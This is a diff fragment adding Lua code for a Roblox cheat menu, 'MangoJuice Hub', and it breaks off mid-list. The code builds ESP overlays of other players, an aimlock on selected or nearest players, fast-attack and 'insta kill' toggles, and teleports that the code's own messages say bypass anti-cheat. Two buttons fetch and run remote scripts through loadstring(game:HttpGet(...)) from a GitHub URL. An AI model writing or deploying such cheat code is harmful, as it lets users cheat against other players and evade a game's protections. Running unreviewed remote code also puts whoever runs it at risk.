+local FPS = false
+local Fog = false
+
+Tabs.SettingsTab:Button({
+    Title = "Remove Fog",
+    Icon = "cloud-off",
+    Callback = function()
+        if Fog == true then
+            WindUI:Notify{
+                Title = "MangoJuice Hub Notify",
+                Content = "You Are Already Remove Fog !",
+                Icon = "solar:bell-bold",
+                Duration = 2
+            }
+        else
+
+        WindUI:Notify{
+            Title = "MangoJuice Hub Notify",
+            Content = "Loading Remove Fog.....",
+            Icon = "solar:bell-bold",
+            Duration = 2
+        }
+
+        task.defer(function()
+            RemoveFog()
+            Fog = true
+        end)
+    end
+end })
+
+Tabs.SettingsTab:Button({
+    Title = "Boost FPS",
+    Icon = "wrench",
+    Callback = function()
+        if FPS == true then
+            WindUI:Notify{
+                Title = "MangoJuice Hub Notify",
+                Content = "You Are Already Boost FPS !",
+                Icon = "solar:bell-bold",
+                Duration = 2
+        }   return 
+        else
+            WindUI:Notify{
+                Title = "MangoJuice Hub Notify",
+                Content = "Loading Boost FPS.....",
+                Icon = "solar:bell-bold",
+                Duration = 2
+        }
+        task.defer(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/mangojuice52042-star/MangoJuice-Hub/refs/heads/main/Boost%20FPS"))()
+        FPS = true
+        end)
+    end  
+end
+})
+
+Tabs.SettingsTab:Button({
+    Title = "Fly GUI",
+    Icon = "plane",
+    Callback = function()
+         WindUI:Notify{
+            Title = "MangoJuice Hub Notify",
+            Content = "Loading Fly GUI.....",
+            Icon = "solar:bell-bold",
+            Duration = 2
+        }
+
+        task.defer(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/mangojuice52042-star/MangoJuice-Hub/refs/heads/main/Mango%20Fly"))()
+        end)
+    end
+})
+
+Tabs.ESPTab:Section({
+    Title = "ESP Settings",
+    TextSize = 15,
+})
+
+Tabs.ESPTab:Slider({
+    Title = "Name & Distance Size",
+    Step = 10,
+    Value = {
+        Min = 100,
+        Max = 250,
+        Default = _G.Config.ESP.NameSize
+    },
+    Callback = function(value)
+        _G.Config.ESP.NameSize = value
+
+        for _, e in pairs(ESPElements) do
+            if e.NameHealthESP then
+                e.NameHealthESP.Size = UDim2.new(0, value, 0, value/4)
+            end
+        end
+    end
+})
+
+Tabs.ESPTab:Slider({
+    Title = "Health Size",
+    Step = 10,
+    Value = {
+        Min = 100,
+        Max = 250,
+        Default = _G.Config.ESP.HealthSize
+    },
+    Callback = function(value)
+        _G.Config.ESP.HealthSize = value
+        for _, e in pairs(ESPElements) do
+            if e.HealthESP then
+                e.HealthESP.Size = UDim2.new(0, value, 0, value/2)
+            end
+        end
+    end
+})
+
+Tabs.ESPTab:Section({
+    Title = "ESP Switch",
+    TextSize = 15,
+})
+
+local NameDistanceToggle
+NameDistanceToggle = Tabs.ESPTab:Toggle({
+    Title = "Name & Distance",
+    Value = _G.Config.ESP.NameDistance,
+    Callback = function(v)
+        if v and not _G.Config.ESP.Enabled then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Please Enable ESP",
+                Icon = "solar:bell-bold",
+                Duration = 3,
+            })
+
+            task.delay(0.5, function()
+                NameDistanceToggle:Set(false)
+            end)
+            return
+        end
+
+        _G.Config.ESP.NameDistance = v
+        UpdateAllESP()
+        
+        if v and _G.Config.ESP.Enabled == true then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Name & Distance ESP Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3,
+            })
+        elseif not v and _G.Config.ESP.Enabled == true then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Name & Distance ESP Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3,
+            })
+        end
+    end
+})
+
+local HealthToggle
+HealthToggle = Tabs.ESPTab:Toggle({
+    Title = "Health",
+    Value = _G.Config.ESP.Health,
+    Callback = function(v)
+        if v and not _G.Config.ESP.Enabled then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Please Enable ESP",
+                Icon = "solar:bell-bold",
+                Duration = 3,
+            })
+
+            task.delay(0.5, function()
+                HealthToggle:Set(false)
+            end)
+            return
+        end
+
+        _G.Config.ESP.Health = v
+        UpdateAllESP()
+
+        if v and _G.Config.ESP.Enabled == true then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Health ESP Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3,
+            })
+        elseif not v and _G.Config.ESP.Enabled == true then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Health ESP Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3,
+            })
+        end
+    end
+})
+
+local TracerToggle
+TracerToggle = Tabs.ESPTab:Toggle({
+    Title = "Tracer",
+    Value = _G.Config.ESP.Tracer,
+    Callback = function(v)
+        if v and not _G.Config.ESP.Enabled then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Please Enable ESP",
+                Icon = "solar:bell-bold",
+                Duration = 3,
+            })
+
+            task.delay(0.5, function()
+                TracerToggle:Set(false)
+            end)
+            return
+        end
+
+        _G.Config.ESP.Tracer = v
+        UpdateAllESP()
+
+        if v and _G.Config.ESP.Enabled == true then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Tracer ESP Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3,
+            })
+        elseif not v and _G.Config.ESP.Enabled == true then
+            
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Tracer ESP Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3,
+            })
+        end
+    end
+})
+
+Tabs.ESPTab:Divider()
+
+Tabs.ESPTab:Toggle({
+    Title = "ESP Pro",
+    Desc = "Main Switch",
+    Type = "Checkbox",
+    Value = _G.Config.ESP.Enabled,
+    Callback = function(v)
+        _G.Config.ESP.Enabled = v
+        UpdateAllESP()
+
+        if v then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "ESP Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 5,
+            })
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "ESP Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 5,
+            })
+            NameDistanceToggle:Set(false)
+            HealthToggle:Set(false)
+            TracerToggle:Set(false)
+            CleanupPlayerESP()
+        end
+    end
+})
+
+wait(0.3)
+
+Tabs.RangeTab:Section({
+    Title = "Attack Settings",
+    TextSize = 15,
+})
+
+local DelayInput
+DelayInput = Tabs.RangeTab:Input({
+    Title = "Attack Delay",
+    Placeholder = "Input Delay (0.1 ~ 10)",
+    Value = tostring(_G.Config.FastAttack.Delay),
+    Callback = function(value)
+        local num = tonumber(value)
+
+        if not num then
+            num = 0.3
+        end
+
+        if num < 0.2 then
+            num = 0.000000000001
+            DelayInput:Set(0.1)
+        elseif num > 10 then
+            num = 10
+            DelayInput:Set(num)
+        end
+        _G.Config.FastAttack.Delay = num
+    end
+})
+
+Tabs.RangeTab:Slider({
+    Title = "Attack Range",
+    Step = 100,
+    Value = {
+        Min = 100,
+        Max = 1000,
+        Default = tonumber(_G.Config.FastAttack.Range)
+    },
+    Callback = function(value)
+        if value > 900 then
+            value = 100000E80
+        end
+        _G.Config.FastAttack.Range = value
+    end
+})
+
+Tabs.RangeTab:Section({
+    Title = "Attack Switch",
+    TextSize = 15,
+})
+
+Tabs.RangeTab:Toggle({
+    Title = "Attack NPC",
+    Value = _G.Config.FastAttack.AttackNPC,
+    Callback = function(state)
+        _G.Config.FastAttack.AttackNPC = state
+    end
+})
+
+Tabs.RangeTab:Toggle({
+    Title = "Attack Players",
+    Value = _G.Config.FastAttack.AttackPlayers,
+    Callback = function(state)
+        _G.Config.FastAttack.AttackPlayers = state
+    end
+})
+
+Tabs.RangeTab:Divider()
+
+Tabs.RangeTab:Toggle({
+    Title = "Fast Attack Pro",
+    Desc = "Main Switch",
+    Type = "Checkbox",
+    Value = _G.Config.FastAttack.Enabled,
+    Callback = function(state)
+        _G.Config.FastAttack.Enabled = state
+        if state then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Fast Attack Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 5
+            })
+        else 
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Fast Attack Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 5
+            })
+        end
+    end
+})
+
+local function getRemote()
+    local char = player.Character
+    local backpack = player:FindFirstChild("Backpack")
+    local tool
+
+    if char then
+        if _G.Config.FastAttack.KitsuneAttack then
+            tool = char:FindFirstChild("Kitsune-Kitsune")
+        elseif _G.Config.FastAttack.DragonAttack then
+            tool = char:FindFirstChild("Dragon-Dragon")
+        elseif _G.Config.FastAttack.GasAttack then
+            tool = char:FindFirstChild("Gas-Gas")
+        end
+
+        if tool then
+            return tool:FindFirstChild("LeftClickRemote", true)
+        end
+    end
+
+    if backpack then
+        if _G.Config.FastAttack.KitsuneAttack then
+            tool = backpack:FindFirstChild("Kitsune-Kitsune")
+        elseif _G.Config.FastAttack.DragonAttack then
+            tool = backpack:FindFirstChild("Dragon-Dragon")
+        elseif _G.Config.FastAttack.GasAttack then
+            tool = backpack:FindFirstChild("Gas-Gas")
+        end
+        if tool then
+            return tool:FindFirstChild("LeftClickRemote", true)
+        end
+    end
+end
+
+task.spawn(function()
+    while task.wait(0.01) do
+        if _G.Config.FastAttack.KitsuneAttack or _G.Config.FastAttack.DragonAttack or _G.Config.FastAttack.GasAttack  then
+
+            local char = player.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            local remote = getRemote()
+
+            if char and hrp and remote then
+                local direction = hrp.CFrame.LookVector
+                    remote:FireServer(direction,2,true)
+                end
+            end
+    end
+end)
+
+Tabs.RangeTab:Section({
+    Title = "Fruits Fast Attack",
+    TextSize = 15,
+})
+
+Tabs.RangeTab:Toggle({
+    Title = "Kitsune Attack",
+    Value = _G.Config.FastAttack.KitsuneAttack,
+    Callback = function(state)
+        _G.Config.FastAttack.KitsuneAttack = state
+    end
+})
+
+Tabs.RangeTab:Toggle({
+    Title = "Dragon Attack",
+    Value = _G.Config.FastAttack.DragonAttack,
+    Callback = function(state)
+        _G.Config.FastAttack.DragonAttack = state
+    end
+})
+
+Tabs.RangeTab:Toggle({
+    Title = "Gas Attack",
+    Value = _G.Config.FastAttack.GasAttack,
+    Callback = function(state)
+        _G.Config.FastAttack.GasAttack = state
+    end
+})
+
+Tabs.RangeTab:Section({
+    Title = "Insta Kill",
+    TextSize = 15,
+})
+
+Tabs.RangeTab:Toggle({
+    Title = "Spikey Trident Insta kill",
+    Desc = "Beta Version (May Kill Youself)",
+    Value = VoidState.SpikeyTrident,
+    Callback = function(v)
+        VoidState.SpikeyTrident = v 
+    end
+})
+
+Tabs.RangeTab:Toggle({
+    Title = "Saishi Insta kill",
+    Desc = "Beta Version",
+    Value = VoidState.Saishi,
+    Callback = function(v)
+        VoidState.Saishi = v
+    end
+})
+
+Tabs.RangeTab.Divider()
+
+Tabs.RangeTab:Toggle({
+    Title = "Insta kill",
+    Desc = "Main Switch",
+    Type = "Checkbox",
+    Value = VoidState.Enabled,
+    Callback = function(state)
+        VoidState.Enabled = state
+        if state then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Insta Kill Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Insta Kill Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        end
+    end
+})
+
+Tabs.AimbotTab:Section({
+    Title = "Players Settings",
+    TextSize = 15,
+})
+
+local AimbotDropdown = Tabs.AimbotTab:Dropdown({
+    Title = "Select Player",
+    Values = Aimbot_GetPlayerList(),
+    Callback = function(value)
+        _G.Config.Aimbot.SelectPlayer = value
+    end
+})
+
+Tabs.AimbotTab:Button({
+    Title = "Refresh Player List",
+    Callback = function()
+
+        local PlayerCount = #Players:GetPlayers()-1
+
+        WindUI:Notify({
+            Title = "MangoJuice Hub Notify",
+            Content = "Current Server Players: " .. PlayerCount .. " / " .. "12",
+            Icon = "solar:bell-bold",
+            Duration = 3
+        })
+
+        local list = Aimbot_GetPlayerList()
+        AimbotDropdown:Refresh(list)
+
+        if _G.Config.Aimbot.SelectPlayer and table.find(list, _G.Config.Aimbot.SelectPlayer) then
+            AimbotDropdown:SetValue(_G.Config.Aimbot.SelectPlayer)
+        else
+            if list[1] then
+                _G.Config.Aimbot.SelectPlayer = list[1]
+                AimbotDropdown:SetValue(list[1])
+            else
+                _G.Config.Aimbot.SelectPlayer = nil
+            end
+        end
+    end
+})
+
+Tabs.AimbotTab:Section({
+    Title = "Aimlock Settings",
+    TextSize = 15,
+})
+
+local AimSelect
+local AimNearest
+
+AimSelect = Tabs.AimbotTab:Toggle({
+    Title = "Aimlock Select Player",
+    Value = _G.Config.Aimbot.AimlockSelect,
+    Callback = function(state)
+        _G.Config.Aimbot.AimlockSelect = state
+        Aimbot_StopAll()
+        if _G.Config.Aimbot.AimlockNearest then
+            AimNearest:Set(false)
+        end
+        task.wait()
+
+        if state and _G.Config.Aimbot.SelectPlayer == nil then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Select Player Please",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            }) 
+            task.wait(0.3)
+            AimSelect:Set(false) 
+            return
+        end
+
+        if state then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Aimlock Select Player Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+            Aimbot_SelectConnection = RunService.RenderStepped:Connect(function()
+                local targetPos = Aimbot_GetSelectedPlayerPosition()
+
+                if targetPos then
+                    local myCharacter = LocalPlayer.Character
+                    if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
+
+                        local myPos = myCharacter.HumanoidRootPart.Position
+                        local distance = (myPos - targetPos).Magnitude
+
+                        if distance <= _G.Config.Aimbot.Distance then
+                            Camera.CFrame = CFrame.new(
+                                Camera.CFrame.Position,
+                                targetPos + Vector3.new(0, 2, 0)
+                            )
+                        end
+
+                    end
+                end
+            end)
+        elseif not state and _G.Config.Aimbot.SelectPlayer ~= nil then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Aimlock Select Player Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        end
+    end
+})
+ 
+AimNearest = Tabs.AimbotTab:Toggle({
+    Title = "Aimlock Nearest Player",
+    Value = _G.Config.Aimbot.AimlockNearest,
+    Callback = function(state)
+        _G.Config.Aimbot.AimlockNearest = state
+        Aimbot_StopAll()
+        if _G.Config.Aimbot.AimlockSelect then
+            AimSelect:Set(false)
+        end
+        task.wait()
+
+        if state then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Aimlock Nearest Player Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+            Aimbot_NearestAimConnection = RunService.RenderStepped:Connect(function()
+                local targetPos = Aimbot_GetNearestPlayer()
+                if targetPos then
+                    Camera.CFrame = CFrame.new(
+                        Camera.CFrame.Position,
+                        targetPos + Vector3.new(0, 2, 0)
+                    )
+                end
+            end)
+        else 
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Aimlock Nearest Player Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })    
+        end
+    end
+})
+
+Tabs.AimbotTab.Divider()
+
+Tabs.AimbotTab:Slider({
+    Title = "Aimbot Distance",
+    Step = 100,
+    Value = {
+        Min = 100,
+        Max = 5000,
+        Default = _G.Config.Aimbot.Distance,
+    },
+    Callback = function(value)
+        _G.Config.Aimbot.Distance = value
+    end
+})
+
+wait(0.3)
+
+local TPPlayerSection = Tabs.TPTab:Section({
+    Title = "Teleport Player",
+    Opened = true,
+    TextSize = 15,
+})
+
+local PlayerDropdown = TPPlayerSection:Dropdown({
+    Title = "Select Player",
+    Values = Teleport_GetPlayerList(),
+    Callback = function(v)
+        _G.Config.Teleport.Settings.SelectPlayer = v
+        WindUI:Notify({
+            Title = "MangoJuice Hub Notify",
+            Content = "Select Teleport Player : " .. v,
+            Icon = "solar:bell-bold",
+            Duration = 5,
+        })
+    end
+})
+
+TPPlayerSection:Button({
+    Title = "Refresh Player List",
+    Callback = function()
+
+        local list = Teleport_GetPlayerList()
+        local PlayerCount = #Players:GetPlayers()-1
+
+        WindUI:Notify({
+            Title = "MangoJuice Hub Notify",
+            Content = "Current Server Players: " .. PlayerCount .. " / " .. "12",
+            Icon = "solar:bell-bold",
+            Duration = 3
+        })
+
+        PlayerDropdown:Refresh(list)
+        PlayerDropdown:Select(nil)
+
+        if _G.Config.Teleport.Settings.SelectPlayer
+           and not table.find(list, _G.Config.Teleport.Settings.SelectPlayer) then
+            _G.Config.Teleport.Settings.SelectPlayer = nil
+        end
+    end
+})
+
+TPPlayerSection:Divider()
+
+TPPlayerSection:Toggle({
+    Title = "Spectate Player",
+    Type = "Checkbox",
+    Value = false,
+    Callback = function(state)
+        if state and not _G.Config.Teleport.Settings.SelectPlayer then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Please Select Player",
+                Icon = "solar:bell-bold",
+                Duration = 5
+            }) return end  
+        if state and _G.Config.Teleport.Settings.SelectPlayer then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Spectate Player Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 5
+            })
+        end      
+        _G.Config.Teleport.Enabled.Spectate = state
+        if _G.Config.Teleport.Enabled.Spectate then
+            SpectatToSelectedPlayer()
+        else
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                Camera.CameraType = Enum.CameraType.Custom
+                Camera.CameraSubject = LocalPlayer.Character.Humanoid
+            end
+        end
+    end
+})
+
+local SlowToggle
+local BypassToggle
+local BypassTogglev2
+
+SlowToggle = TPPlayerSection:Toggle({
+    Title = "Teleport to Player",
+    Type = "Checkbox",
+    Value = _G.Config.Teleport.Enabled.ToPlayer,
+    Callback = function(state)
+        if _G.Config.Teleport.Enabled.Bypass == true then
+            BypassToggle:Set(false)
+        end
+
+        _G.Config.Teleport.Enabled.ToPlayer = state
+
+        if state then
+
+            if not _G.Config.Teleport.Settings.SelectPlayer then
+                WindUI:Notify({
+                    Title = "MangoJuice Hub Notify",
+                    Content = "Please Select Player first",
+                    Icon = "solar:bell-bold",
+                    Duration = 3
+                })
+                _G.Config.Teleport.Enabled.ToPlayer = false
+                return
+            end
+
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Teleport to Player Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+
+            if fm then
+                fm:EnableNoClip()
+            end
+
+            _G.Config.Teleport.Enabled.ToPlayer = true
+            startFollow()
+            startFollowStateGuard()
+
+        else
+
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Teleport Player Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 5
+            })
+
+            if fm then
+                fm:DisableNoClip()
+            end
+
+            _G.Config.Teleport.Enabled.ToPlayer = false
+            stopFollow()
+            stopFollowStateGuard()
+        end
+    end
+})
+
+BypassToggle = TPPlayerSection:Toggle({
+    Title = "Teleport to Player Bypass",
+    Type = "Checkbox",
+    Value = _G.Config.Teleport.Enabled.Bypass,
+    Callback = function(v)
+        if _G.Config.Teleport.Enabled.ToPlayer == true then
+            SlowToggle:Set(false)
+        end
+        if v and not _G.Config.Teleport.Settings.SelectPlayer then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Please Select Player first",
+                Icon = "solar:bell-bold",
+                Duration = 5
+            })
+            _G.Config.Teleport.Enabled.Bypass = false
+            BypassToggle:Set(false)
+                    stopFollow()
+                stopFollowStateGuard()
+            return
+        end
+        _G.Config.Teleport.Enabled.Bypass = v
+        if v then
+            task.spawn(function()
+                WindUI:Notify({
+                    Title = "MangoJuice Hub Notify",
+                    Content = "Teleport Player Bypass Enabled",
+                    Icon = "solar:bell-bold",
+                    Duration = 5
+                })
+                        startFollow()
+                    startFollowStateGuard()
+            end)
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Teleport Player Bypass Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 5
+            })
+            stopFollow()
+            stopFollowStateGuard()
+        end
+    end
+})
+
+TPPlayerSection:Divider()
+
+TPPlayerSection:Slider({
+    Title = "Offset X",
+    Step = 10,
+    Value = {
+        Min = -300,
+        Max = 300,
+        Default = _G.Config.Teleport.Settings.OffsetX,
+    },
+    Callback = function(v)
+        _G.Config.Teleport.Settings.OffsetX = v
+    end
+})
+
+TPPlayerSection:Slider({ 
+    Title = "Offset Y",
+    Step = 10,
+    Value = {
+        Min = -300,
+        Max = 300,
+        Default = _G.Config.Teleport.Settings.OffsetY,
+    },
+    Callback = function(v)
+        _G.Config.Teleport.Settings.OffsetY = v
+    end
+})
+
+TPPlayerSection:Slider({
+    Title = "Offset Z",
+    Step = 10,
+    Value = {
+        Min = -300,
+        Max = 300,
+        Default = _G.Config.Teleport.Settings.OffsetZ,
+    },
+    Callback = function(v)
+        _G.Config.Teleport.Settings.OffsetZ = v
+    end
+})
+
+local TPIslandSection = Tabs.TPTab:Section({
+    Title = "Teleport Island",
+    Opened = true,
+    TextSize = 15,
+})
+
+local IslandDropdown = TPIslandSection:Dropdown({
+    Title = "Select Island",
+    Values = Island[CurrentSea],
+    Callback = function(v)
+        _G.Config.Teleport.Settings.SelectIsland = v
+    end
+})
+
+local TeleportIsland
+
+TeleportIsland = TPIslandSection:Toggle({
+    Title = "Teleport to Island",
+    Desc = "You Will Reset For Teleport",
+    Value = _G.Config.Teleport.Enabled.Island,
+    Callback = function(state)
+        if Teleporting then return end
+        if not state then return end
+
+        if not _G.Config.Teleport.Settings.SelectIsland or not Maps[CurrentSea][_G.Config.Teleport.Settings.SelectIsland] then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Please Select Island",
+                Icon = "solar:bell-bold",
+                Duration = 5
+            })
+            task.delay(0.3, function() TeleportIsland:Set(false) end)
+            return
+        end
+
+        local character = Player.Character or Player.CharacterAdded:Wait()
+        local hrp = character:WaitForChild("HumanoidRootPart")
+        local targetPos = Maps[CurrentSea][_G.Config.Teleport.Settings.SelectIsland]
+        local distance = (hrp.Position - targetPos).Magnitude
+
+        if distance < 1000 then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "You are already on this island",
+                Icon = "solar:bell-bold",
+                Duration = 5
+            })
+            task.delay(0.3, function() TeleportIsland:Set(false) end)
+            return
+        end
+
+        WindUI:Notify({
+            Title = "MangoJuice Hub Notify",
+            Content = "Teleporting.....\n\nYour camera will have locked to bypass anti cheat",
+            Icon = "solar:bell-bold",
+            Duration = 10
+        })
+
+        doTeleport()
+
+        if RespawnConnection then
+            RespawnConnection:Disconnect()
+            RespawnConnection = nil
+        end
+
+        RespawnConnection = Player.CharacterAdded:Connect(function(char)
+            task.wait(1)
+            local NewHRP = char:WaitForChild("HumanoidRootPart")
+            local NewDistance = (NewHRP.Position - targetPos).Magnitude
+
+            if NewDistance > 500 and not Teleporting then
+                WindUI:Notify({
+                    Title = "MangoJuice Hub Notify",
+                    Content = "Teleport Failed\n\nTeleport Again.....",
+                    Icon = "solar:bell-bold",
+                    Duration = 10
+                })
+                task.wait(2)
+                doTeleport()
+            else
+                WindUI:Notify({
+                    Title = "MangoJuice Hub Notify",
+                    Content = "Teleport Completed !",
+                    Icon = "solar:bell-bold",
+                    Duration = 5
+                })
+
+                task.delay(0.3, function()
+                    TeleportIsland:Set(false)
+                end)
+
+                if RespawnConnection then
+                    RespawnConnection:Disconnect()
+                    RespawnConnection = nil
+                end
+            end
+        end)
+    end
+})
+
+TPIslandSection:Divider()
+
+if SecondSea then
+
+    TPIslandSection:Button({
+        Title = "Teleport To Cafe",
+        Callback = function()
+            for i = 1, 3 do
+            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 281.93707275390625, 306.130615234375, 609.280029296875))
+            task.defer(function()
+            Player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(- 317.02, 76.15, 346.73))
+            end)
+        end
+        WindUI:Notify({
+            Title = "MangoJuice Hub Notify",
+            Content = "Successful Teleport To Cafe !",
+            Icon = "solar:bell-bold",
+            Duration = 3
+        })
+    end
+    })
+
+    TPIslandSection:Button({
+        Title = "Teleport To Mansion",
+        Callback = function()
+            for i = 1, 3 do
+            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 281.93707275390625, 306.130615234375, 609.280029296875))
+            task.defer(function()
+            Player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(- 396.03, 374.91, 645.84))
+            end)
+        end
+        WindUI:Notify({
+            Title = "MangoJuice Hub Notify",
+            Content = "Successful Teleport To Mansion !",
+            Icon = "solar:bell-bold",
+            Duration = 3
+        })
+    end
+    })
+
+    TPIslandSection:Button({
+        Title = "Teleport To Flamingo Room",
+        Callback = function()
+            for i = 1, 3 do
+            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(2284.912109375, 15.152034759521484, 905.48291015625))
+            task.defer(function()
+            Player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(2288.45, 95.20, 760.03))
+            end)
+        end
+        WindUI:Notify({
+            Title = "MangoJuice Hub Notify",
+            Content = "Successful Teleport To Flamingo Room !",
+            Icon = "solar:bell-bold",
+            Duration = 3
+        })
+    end
+    })
+
+    TPIslandSection:Button({
+        Title = "Teleport To Cursed Ship",
+        Callback = function()
+            for i = 1, 3 do
+            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.40197753906, 125.05712890625, 32885.875))
+            task.defer(function()
+            Player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(922.92, 183, 32968.97))
+            end)
+        end
+        WindUI:Notify({
+            Title = "MangoJuice Hub Notify",
+            Content = "Successful Teleport To Cursed Ship !",
+            Icon = "solar:bell-bold",
+            Duration = 3
+        })
+    end
+    })
+
+    TPIslandSection:Button({
+        Title = "Teleport To Cursed Ship Outside",
+        Callback = function()
+            for i = 1, 3 do
+            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-6508.56, 83.23, -132.84))
+            task.defer(function()
+            Player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-6560.02, 552.11, -207.32))
+            end)
+        end
+        WindUI:Notify({
+            Title = "MangoJuice Hub Notify",
+            Content = "Successful Teleport To Cursed Ship Outside !",
+            Icon = "solar:bell-bold",
+            Duration = 3
+        })
+    end
+    })
+
+    elseif ThirdSea then
+
+    TPIslandSection:Button({
+        Title = "Teleport To Castle On The Sea",
+        Callback = function()
+            for i = 1, 3 do
+            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 5075.50927734375, 314.5155029296875, - 3150.0224609375))
+            task.defer(function()
+            Player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-4999.45, 314.56, -3010.54))
+            end)
+        end
+        WindUI:Notify({
+            Title = "MangoJuice Hub Notify",
+            Content = "Successful Teleport To Castle On The Sea !",
+            Icon = "solar:bell-bold",
+            Duration = 3
+        })
+    end
+    })
+
+    TPIslandSection:Button({
+        Title = "Teleport To Turtle Mansion",
+        Callback = function()
+            for i = 1, 3 do
+            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 12468.5380859375, 375.0094299316406, - 7554.62548828125))
+            task.defer(function()
+            Player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-12592.93, 336.96, -7470.36))
+            end)
+        end
+        WindUI:Notify({
+            Title = "MangoJuice Hub Notify",
+            Content = "Successful Teleport To Turtle Mansion !",
+            Icon = "solar:bell-bold",
+            Duration = 3
+        })
+    end
+    })
+
+    TPIslandSection:Button({
+        Title = "Teleport To Tiki Outpost",
+        Callback = function()
+            Player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-5098.99, 316.53, -3180.95))
+            task.wait(0.7)
+            Player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-16835.16, 58.30, 401.62))
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Successful Teleport To Tiki Outpost !",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        end
+    })
+
+    TPIslandSection:Button({
+        Title = "Teleport To Hydra",
+        Callback = function()
+            for i = 1, 3 do
+            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(5661.5322265625, 1013.0907592773438, - 334.9649963378906))
+            task.defer(function()
+            Player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(5772.47, 1013.24, -40.63))
+            end)
+        end
+        WindUI:Notify({
+            Title = "MangoJuice Hub Notify",
+            Content = "Successful Teleport To Hydra !",
+            Icon = "solar:bell-bold",
+            Duration = 3
+        })
+    end
+    })
+end
+
+Tabs.UITab:Section({
+    Title = "UI Settings",
+    TextSize = 15,
+})
+
+Tabs.UITab:Dropdown({
+    Title = "Select Theme",
+    Values = {"Light",
+              "Dark",
+              "Midnight",
+              "Rainbow",
+              "Mellowsi",
+              "CottonCandy",
+              "MonokaiPro",
+              "Crimson",
+              "Emerald",
+              "Amber",
+              "Violet",
+              "Sky",
+              "Indigo",
+              "Red",
+              "Plant",
+              "Rose",
+             },
